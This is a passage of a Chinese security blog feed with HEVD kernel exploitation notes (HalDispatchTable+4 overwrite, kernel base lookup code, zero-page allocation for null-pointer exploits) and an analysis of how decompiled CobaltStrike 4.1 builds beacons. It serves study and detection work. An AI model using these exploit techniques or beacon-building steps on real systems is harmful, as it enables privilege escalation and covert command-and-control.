 <span class="keyword">je</span>      nt!NtQueryIntervalProfile+<span class="number">0x8f</span> (8414ffca)</div><div class="line">8414ffaf c745fc01000000  <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>],<span class="number">1</span></div><div class="line">8414ffb6 <span class="number">8906</span>            <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>],<span class="built_in">eax</span></div><div class="line">8414ffb8 eb07            <span class="keyword">jmp</span>     nt!NtQueryIntervalProfile+<span class="number">0x86</span> (8414ffc1)</div><div class="line">8414ffba 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">8414ffbc <span class="number">40</span>              <span class="keyword">inc</span>     <span class="built_in">eax</span></div><div class="line">//======&gt;nt!KeQueryIntervalProfile</div><div class="line">kd&gt; U nt!KeQueryIntervalProfile l20</div><div class="line">nt!KeQueryIntervalProfile:</div><div class="line">8410e891 8bff            <span class="keyword">mov</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span></div><div class="line">8410e893 <span class="number">55</span>              <span class="keyword">push</span>    <span class="built_in">ebp</span></div><div class="line">8410e894 8bec            <span class="keyword">mov</span>     <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line">8410e896 83ec10          <span class="keyword">sub</span>     <span class="built_in">esp</span>,<span class="number">10h</span></div><div class="line">8410e899 83f801          <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="number">1</span></div><div class="line">8410e89c <span class="number">7507</span>            <span class="keyword">jne</span>     nt!KeQueryIntervalProfile+<span class="number">0x14</span> (8410e8a5)</div><div class="line">8410e89e a1889afa83      <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [nt!KiProfileAlignmentFixupInterval (83fa9a88)]</div><div class="line">8410e8a3 c9              <span class="keyword">leave</span></div><div class="line">8410e8a4 c3              <span class="keyword">ret</span></div><div class="line">8410e8a5 8945f0          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>],<span class="built_in">eax</span></div><div class="line">8410e8a8 8d45fc          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">ebp</span>-<span class="number">4</span>]</div><div class="line">8410e8ab <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">8410e8ac 8d45f0          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">ebp</span>-<span class="number">10h</span>]</div><div class="line">8410e8af <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">8410e8b0 6a0c            <span class="keyword">push</span>    <span class="number">0Ch</span></div><div class="line">8410e8b2 6a01            <span class="keyword">push</span>    <span class="number">1</span></div><div class="line">8410e8b4 ff15bcf3f683    <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [nt!HalDispatchTable+<span class="number">0x4</span> (83f6f3bc)]</div><div class="line">8410e8ba 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">8410e8bc 7c0b            <span class="keyword">jl</span>      nt!KeQueryIntervalProfile+<span class="number">0x38</span> (8410e8c9)</div><div class="line">8410e8be 807df400        <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>],<span class="number">0</span></div><div class="line">8410e8c2 <span class="number">7405</span>            <span class="keyword">je</span>      nt!KeQueryIntervalProfile+<span class="number">0x38</span> (8410e8c9)</div><div class="line">8410e8c4 8b45f8          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>]</div><div class="line">8410e8c7 c9              <span class="keyword">leave</span></div><div class="line">8410e8c8 c3              <span class="keyword">ret</span></div></pre></td></tr></table></figure></p><h2 id="0x4-2-漏洞利用"><a href="#0x4-2-漏洞利用" class="headerlink" title="0x4.2 漏洞利用"></a>0x4.2 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先第一步打开设备，第二歩就是获取HalDispatchTable+4地址，这个地址用来存放ShellCode。获取<code>获取HalDispatchTable+4</code>地址主要有四步，因为<code>HalDispatchTable</code>这个地址在R3是导出的，只需要获取<code>ntkrnlpa.exe</code>在R3的基地址和R0的基地址，<code>HalDispatchTable</code>在R3的地址，减去<code>ntkrnlpa.exe</code>在R3的基地址，加上R0的基地址就是<code>HalDispatchTable</code>在R0的地址。所以获取<code>HalDispatchTable</code>在R0地址只需要四步。</p><ul><li>获取<code>ntkrnlpa.exe</code>在R0基地址</li><li>通过<code>LoadLibrary</code>获取<code>ntkrnlpa.exe</code>在R3基地址</li><li>通过<code>GetProcAddress</code>获取<code>HalDispatchTable</code>在R3的地址</li><li>计算<code>HalDispatchTable</code>在R0的的地址<br>  <img src="http://hacky.wang/blog/20220720/TCkVreVYvKrV.png?imageslim" alt="mark"></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中如何获取<code>ntkrnlpa.exe</code>在R0的基地址呢。首先<code>EnumDeviceDrivers</code>获取所有的驱动模块基地址，然后根据基地址，调用<code>GetDeviceDriverBaseNameA</code>获取驱动名，依次比较是否是<code>ntkrnlpa.exe</code>即可。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function">PVOID <span class="title">GetBaseAddrOfntkrnlpaInKernel</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="comment">//遍历所有的驱动程序基地址</span></div><div class="line">LPVOID lpImageBase[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">DWORD lpcbNeeded = <span class="number">0</span>;</div><div class="line">TCHAR lpfileName[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">EnumDeviceDrivers(lpImageBase, <span class="keyword">sizeof</span>(lpImageBase),&amp;lpcbNeeded);   <span class="comment">//#include&lt;Psapi.h&gt;</span></div><div class="line"><span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; (lpcbNeeded / <span class="keyword">sizeof</span>(LPVOID)); i++)</div><div class="line">&#123;</div><div class="line">GetDeviceDriverBaseNameA(lpImageBase[i], lpfileName, <span class="number">48</span>);</div><div class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(lpfileName, <span class="string">"ntkrnlpa.exe"</span>))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+]success to get %s\n"</span>, lpfileName);</div><div class="line"><span class="keyword">return</span> lpImageBase[i];</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三步，触发漏洞，将Shellcode地址作为What参数传入，然后将<code>HalDispatchTable+4</code>作为Where传入，因为任意地址覆盖，就可以将Shellcode地址覆盖到<code>HalDispatchTable+4</code>地址，然后只需要调用<code>NtQueryIntervalProfile</code>触发执行就可以了。<code>NtQueryIntervalProfile</code>第一个参数值应该可以任意数字。</p><h2 id="0x4-3-参考"><a href="#0x4-3-参考" class="headerlink" title="0x4.3 参考"></a>0x4.3 参考</h2><ul><li><a href="https://bbs.pediy.com/thread-252506.htm" target="_blank" rel="external">Windows Kernel Exploit 内核漏洞学习(3)-任意内存覆盖漏洞</a></li><li><a href="https://bbs.pediy.com/thread-270176.htm" target="_blank" rel="external">HEVD学习笔记之任意地址写入</a></li></ul><h1 id="0x5-空指针解引用"><a href="#0x5-空指针解引用" class="headerlink" title="0x5 空指针解引用"></a>0x5 空指针解引用</h1><h2 id="0x5-1-成因分析"><a href="#0x5-1-成因分析" class="headerlink" title="0x5.1 成因分析"></a>0x5.1 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;释放完内存并将指针清空，但如果再次对这个指针进行引用，就会触发空指针引用漏洞，值得注意的是，要区分UAF和空指针解引用的区别，即，UAF是因为释放了内存，但是指针并没有置NULL，从而导致程序出现异常，<strong>可以通过占位的方式对该漏洞进行利用。</strong>而空指针解引用是指释放了内存，同时也置空了指针，但是仍对该指针进行引用导致异常。因为对空指针进行引用，<strong>如果提前在地址为0的地方提前写入shellcode，即可对空指针解引用进行利用。</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">typedef void(* pFuncAddr)()<span class="comment">;</span></div><div class="line">void test()</div><div class="line">&#123;</div><div class="line">    printf(<span class="string">"test\n"</span>)<span class="comment">;</span></div><div class="line">&#125;</div><div class="line"><span class="built_in">int</span> main()</div><div class="line">&#123;</div><div class="line">    PDWORD <span class="function"><span class="keyword">func</span> = <span class="params">(PDWORD)</span><span class="title">malloc</span><span class="params">(<span class="number">4</span>)</span>;</span></div><div class="line">    *<span class="function"><span class="keyword">func</span> = <span class="params">(DWORD)</span><span class="title">test</span>;</span></div><div class="line">    ((pFuncAddr)*<span class="function"><span class="keyword">func</span>)<span class="params">()</span>;</span></div><div class="line">    free(<span class="function"><span class="keyword">func</span>);</span></div><div class="line">    <span class="function"><span class="keyword">func</span> = <span class="title">NULL</span>;</span></div><div class="line">    ((pFuncAddr)*<span class="function"><span class="keyword">func</span>)<span class="params">()</span>;</span></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在HEVD中，空指针解引用漏洞位于<code>TriggerNullPointerDereference</code>函数中，反汇编效果所示，首先在第9行，Allocate空间，然后在19行比较传入的数据是否是<code>BAD0B0B0</code>,如果是在为KernelBuffer赋值，并设置回调函数，如果不是，如33，34行所示则<code>释放内存，并将指针置空</code>。无论是否为<code>BAD0B0B0</code>都会调用KernelBuffer的回调函数，也就是使用了KernelBuffer。如果KernelBuffer指针没有置空，是不会有问题的，但如果KernelBuffer指针置空了，就会导致空指针解引用。<br>    <img src="http://hacky.wang/blog/20220725/i1iNM91vbJD8.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过观察HEVD源码，发现修复之后的的逻辑是先校验了NullPointerDereference指针是否为空，然后在调用回调函数。<br>    <img src="http://hacky.wang/blog/20220725/fFW4YxQesO5c.png?images![](空指针解引用" alt="mark">lim)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<a href="http://blog.nsfocus.net/null-pointer-vulnerability-analysis-defense/" target="_blank" rel="external">这篇文章</a>里面，也很好介绍了空指针和野指针(UAF)</p><h2 id="0x5-2-漏洞利用"><a href="#0x5-2-漏洞利用" class="headerlink" title="0x5.2 漏洞利用"></a>0x5.2 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前面也具体讲了如何根据空指针解引用来进行漏洞利用，因为部分exp写的还是比较复杂，详细说说，这个漏洞利用就是通过事先开辟好零页，并将shellcode事先放到回调函数的地方。也就是(Null+4)的地址。<br>    <img src="http://hacky.wang/blog/20220725/g7X2bwkpAN7f.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在观察代码逻辑，只要传入的值不是<code>BAD0B0B0</code>，就会释放之前开辟的内存，并置空指针，从而导致空指针解引用。也就是说R3传入的Buffer内部只要不是<code>BAD0B0B0</code>就可以了。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后来讲一下零页内存，空指针指向的就是零页内存，在漏洞利用过程中，我们使用<code>NtAllocateVirtualMemory</code>ntdll层API函数申请零页内存，具体实现如下。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOL </span>AllocateZeroPage()</div><div class="line">&#123;</div><div class="line">pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>),</div><div class="line"><span class="string">"NtAllocateVirtualMemory"</span>)<span class="comment">;</span></div><div class="line">if (NULL == NtAllocateVirtualMemory)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!] Get NtAllocateVirtualMemory Error\n"</span>)<span class="comment">;</span></div><div class="line">return FALSE<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">printf(<span class="string">"[*] NtAllocateVirtualMemory Address is :0x%p \n"</span>, NtAllocateVirtualMemory)<span class="comment">;</span></div><div class="line">NTSTATUS ntStatus = <span class="number">0</span><span class="comment">;</span></div><div class="line">PVOID <span class="keyword">BaseAddress </span>= (PVOID)<span class="number">0x00000001</span><span class="comment">;</span></div><div class="line">SIZE_T RegionSize = <span class="number">0x1000</span><span class="comment">;</span></div><div class="line">ntStatus = NtAllocateVirtualMemory((HANDLE)<span class="number">0xFFFFFFFF</span>,</div><div class="line">&amp;<span class="keyword">BaseAddress,</span></div><div class="line"><span class="keyword"></span><span class="number">0</span>,</div><div class="line">&amp;RegionSize,</div><div class="line">MEM_RESERVE <span class="title">| MEM_COMMIT |</span> MEM_TOP_DOWN,</div><div class="line">PAGE_EXECUTE_READWRITE)<span class="comment">;</span></div><div class="line">if (ntStatus != <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!]Execuate NtAllocateVirtualMemory Error\n"</span>)<span class="comment">;</span></div><div class="line">return FALSE<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">return TRUE<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我在学习这段代码的时候，有个困惑就是为什么传入的BaseAddress值为什么是<code>(PVOID)0x00000001</code>,然后我看了<a href="http://blog.nsfocus.net/null-pointer-vulnerability-defense/" target="_blank" rel="external">空指针漏洞防护技术 提高篇</a>为我解答了疑惑，当BaseAddress为<code>0</code>的时候，并不能在零页内存中开辟空间，将AllocateType设置为MEM_TOP_DOWN，表示自上而下的分配内存，然后当BaseAddress设置为一个低地址，例如<code>1</code>,同时指定分配内存的大小大于这个值,例如<code>0x1000</code>,这样就可以申请到的内存包含了零页内存。</p><h2 id="0x5-3-参考"><a href="#0x5-3-参考" class="headerlink" title="0x5.3 参考"></a>0x5.3 参考</h2><ul><li><a href="https://bbs.pediy.com/thread-270198.htm" target="_blank" rel="external">HEVD学习笔记之空指针引用</a></li><li><a href="https://bbs.pediy.com/thread-252776.htm" target="_blank" rel="external">Windows Kernel Exploit 内核漏洞学习(5)-空指针解引用 </a></li><li><a href="http://blog.nsfocus.net/null-pointer-vulnerability-analysis-defense/" target="_blank" rel="external">空指针漏洞防护技术-初级篇</a></li><li><a href="http://blog.nsfocus.net/null-pointer-vulnerability-defense/" target="_blank" rel="external">空指针漏洞防护技术 提高篇</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;HEVD简单学习
    
    </summary>
    
      <category term="漏洞分析" scheme="https://findream.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike Beacon生成原理分析</title>
    <link href="https://findream.github.io/2022/06/26/CobaltStrike%20Beacon%E7%94%9F%E6%88%90%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/06/26/CobaltStrike Beacon生成原理分析/</id>
    <published>2022-06-26T06:02:11.000Z</published>
    <updated>2022-08-18T11:04:46.440Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言与背景"><a href="#0x00-前言与背景" class="headerlink" title="0x00 前言与背景"></a>0x00 前言与背景</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文没有什么创新，只是在学习beacon生成和调试分析和检测beacon的过程中的一些记录。本文首发于跳跳糖安全社区(<a href="https://tttang.com/archive/1631/" target="_blank" rel="external">https://tttang.com/archive/1631/</a>)</p><a id="more"></a><h2 id="0x01-二次开发CobaltStrike"><a href="#0x01-二次开发CobaltStrike" class="headerlink" title="0x01 二次开发CobaltStrike"></a>0x01 二次开发CobaltStrike</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我这是在网上找到的一个由鸡哥反编译的一个CobaltStrike4.1版本，所以不在需要重新反编译了。如下是工作目录。<code>decomplie_src</code>是存储着CS反编译的代码，<code>lib目录</code>存储着cobaltstrike4.1.jar文件，作为库文件。<code>out</code>作为编译输出的目录，<code>src</code>存放着所需要的源码文件，也就是<code>decomplie_src</code>源码的子集。这里需要使用的工具是IDEA。<br>    <img src="http://hacky.wang/blog/20220624/JlMIrVX7WosS.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先新建一个项目，设置好项目名和路径之后，在Project下面新建两个目录，<code>decomplie_src</code>和<code>lib</code>目录。<br>    <img src="http://hacky.wang/blog/20220624/180Hr5HH5CL2.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220624/MW2SFwlDHsvD.png?imageslim" alt="mark"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;把反编译之后的decomplie_src目录里面的所有java文件复制到项目中的<code>decomplie_src</code>,并把cobaltstrike4.1.jar文件放到项目中的<code>lib</code>目录。<br>    <img src="http://hacky.wang/blog/20220624/u5icDjw78qF9.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对项目进行设置，添加模块依赖，在路径<code>File--&gt;Project Structure--&gt;Modules--&gt;Dependencies</code>设置SDK。然后在Dependencies这个页面点一下”+”号，添加jar包，完成后点应用。<br>    <img src="http://hacky.wang/blog/20220624/MlCs7zXcxrgt.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220624/Njln99Ifj5R0.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;进入<code>Artifacts--&gt;JAR--&gt;From modules with dependencies</code>,设置一个MAIN CLASS为<code>aggressor.Aggressor</code>,这个值可以在<code>MANIFEST.MF</code>文件中查看。完成之后就是这样的结果。<br>    <img src="http://hacky.wang/blog/20220624/J5byFdOSvIlw.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220624/o8DxDDIsJRol.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后就是将<code>decomplie_src</code>复制到<code>src</code>中，这里直接将网上编译的那个版本的src目录复制到本项目的<code>src</code>目录中，如果有其他需求可以自己从<code>decomplie_src</code>复制添加即可。<br>    <img src="http://hacky.wang/blog/20220624/KQNB44PIg1kw.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Build --&gt;Build Artifacts --&gt;Build</code>进行编译。在out目录就可以看到生成的.jar文件。<br>    <img src="http://hacky.wang/blog/20220624/KNJt0CWWtRNk.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>Run --&gt; Profile--&gt;Edit...</code>编辑配置，选择“+”号，在JAR Application添加一个配置文件。在<code>Path to jar</code>选择编译生成的jar包路径。在<code>VM Optionals</code>填入<code>-XX:+AggressiveHeap -XX:+UseParallelGC</code><br>    <img src="http://hacky.wang/blog/20220624/pRronaNRd0QF.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以后每次要运行或者调试的时候，都可以<code>Run--&gt;Profile--&gt;Run(debug)</code><br>    <img src="http://hacky.wang/blog/20220624/Pr7DFcptxIjA.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后就完成了。<br>    <img src="http://hacky.wang/blog/20220624/LhpRo180mPGe.png?imageslim" alt="mark"></p><h2 id="0x02-beacon生成原理"><a href="#0x02-beacon生成原理" class="headerlink" title="0x02 beacon生成原理"></a>0x02 beacon生成原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;beacon生成主要有3个步骤，首先是将C2Patch的相关数据patch到beacon中，便于beacon使用，第二步，处理beacon的PE数据和添加引导shellcode，这段shellcode是引导执行ReflectiveLoader。第三步将beacon加密，并和一些数据patch到loader中。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在beacon生成这块，主要涉及到4个java文件。BeaconPayload.java主要是对beacon进行C2Profile相关的处理，主要涉及的函数为<code>exportBeaconStage</code>。MalleablePE.java，主要用于对beacon进行一些PE相关的处理，主要涉及的函数为<code>process</code>函数。而BeaconLoader.java主要是patch beacon的开头那段shellcode。主要涉及到<code>patchDOSHeader</code>函数。BaseArtifactUtils主要是将加密beacon数据和一些加密beacon的key之类的数据patch到loader模板上，</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CobaltStrike服务端，通过()生成beacon，经过分析，将断点分别下在<code>WindowsExecutableStageDialog.dialogAction</code>和<code>WindowsExecutableStageDialog.dialogResult</code>这两个函数处。通过 dialogAction函数，选择需要保存的文件的内容或者格式。然后调用<code>SafeDialogs.saveFile</code>函数，弹出保存文件的选择框。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着调用<code>dialogResult</code>函数，dialogResult函数是生成beacon的主要流程，参数的参数var1表示保存beacon的路径。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;依次获取架构类型(x86或者x64)，然后监听器这里选的是reverse_http。<br>    <img src="http://hacky.wang/blog/20220623/QSe5gp6RBP5h.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后调用<code>ScListener.export</code>函数,export函数的作用是通过不同的监听器，选择不同的Stage。本例中是调用eaconPayload.exportBeaconStageHTTP函数。exportBeaconStageHTTP的参数分别是(var1)端口，(var2)链接地址，var3，var4分别是false，var5是架构。通过不同的架构选择不同的BeaconStage数据。<br>    <img src="http://hacky.wang/blog/20220623/rJjcOad9snpb.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/7INX6IdrJkKe.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>exportBeaconStage</code>函数中，首先调用<code>SleevedResource.readResource</code>加载指定的beacon原始文件<br>    <img src="http://hacky.wang/blog/20220623/C48efyX0dfK6.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后读取C2Profile中的uri等C2Profile信息。我曾经根据这些默认的C2Profile的URI信息，捞到过一批有价值的CobaltStrike样本。<br>    <img src="http://hacky.wang/blog/20220623/D83MeRV78tAw.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/A4UuK5aWOAXl.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在解析完C2Profile数据之后，就会按照一定的顺序将这些C2Profile的参数拼装起来，并patch到beacon中，以供beacon使用。<br>    <img src="http://hacky.wang/blog/20220623/bu0YQ14ummLY.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/uYJiQEmLmNSl.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>beacon\BeaconConstants.java</code>这个文件中，可以看到C2Profile数据拼接序号的含义。在之前分析exportBeaconStageHTTP参数的时候，var1为端口。可以看到这里第二个处理的就是端口。而<code>beacon\BeaconConstants.java</code>文件的第二项的内容也是端口。<br>    <img src="http://hacky.wang/blog/20220623/NTpTzsELKAWb.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/YQ1tnjtbB2AN.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;拼接C2Profile数据的是和，CobaltStrike使用<code>addShort</code>,<code>addInt</code>,<code>addData</code>,<code>addString</code>四个函数添加数据。其中前三个为基本函数，<code>addString</code>底层是通过<code>addData</code>实现的。以addData为例子，通过分析参数，可知依次添加了index，type，length，和value。且如果是short类型，type为1，如果是int类型，type为2，如果是Data或者string类型呢，type就为3了。<br>    <img src="http://hacky.wang/blog/20220623/S9zasGjerEo7.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/AdwyrgXHhL1Y.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/KERO9tQq3u5y.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后将这些数据转化为byte类型，然后将其与46进行进行异或运算。<br>    <img src="http://hacky.wang/blog/20220623/pxWGVGjqc0x1.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将读取的原始beacon文件的byte转化为string类型，并定位其中的“AAAABBBBCCCCDDDDEEEEFFFF”字符串。然后用C2Profile数据替换掉。<br>    <img src="http://hacky.wang/blog/20220623/q9NJ8sBWPW3i.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当C2Profile的数据patch到beacon之后呢，开始处理PE数据，CobaltStrike在处理PE数据的时候分为两部，首先会对PE数据进行预处理，也就是从C2Profile中读取关于PE处理的相关数据，例如image_size，compile_time等等，然后对这些PE的基础数据进行处理。<br>    <img src="http://hacky.wang/blog/20220623/qCRTUnlNqiKV.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在对PE数据进行预处理之后呢，根据所选择的架构不同，patch DOS头，也就是前面那段shellcode。首先调用findReflectiveLoader函数，通过导出表获取<code>ReflectiveLoader</code>导出函数地址。然后将该地址填充到shellcode中，其实分析过这种stage类型的beacon会发现，这种payload本质就是一个PE文件，只不过PE头被修改成一段可以执行的shellcode，这个shellcode的目的就是引导至ReflectiveLoader函数。<br>    <img src="http://hacky.wang/blog/20220623/obL6hTFYlzJB.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造合适的Loader,在<code>_patchArtifact</code>函数中，首先读取指定的Loader的模板，该模板位于resources/目录下面，然后生成一组随机的byte数组，并用这些数组对beacon进行异或加密，这也是为什么每个生成的beacon都是不一样的原因。<br>    <img src="http://hacky.wang/blog/20220623/Gh1YbaAyjc8N.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后依次保存1024个A所在地址偏移+16这个地址，beacon的长度，异或加密的随机数组，GetModuleHandleA，GetProcAddress函数地址(如果可以的话)，保存加密之后的beacon数据，将上述数据替换到那1024个A处。然后将byte[]写入指定文件即完成beacon的生成。<br>    <img src="http://hacky.wang/blog/20220623/cs0HIULgMsED.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/4ouN66Vuhwxy.png?imageslim" alt="mark"></p><h2 id="0x03-beacon分析调试"><a href="#0x03-beacon分析调试" class="headerlink" title="0x03 beacon分析调试"></a>0x03 beacon分析调试</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上面分析，cobalt strike 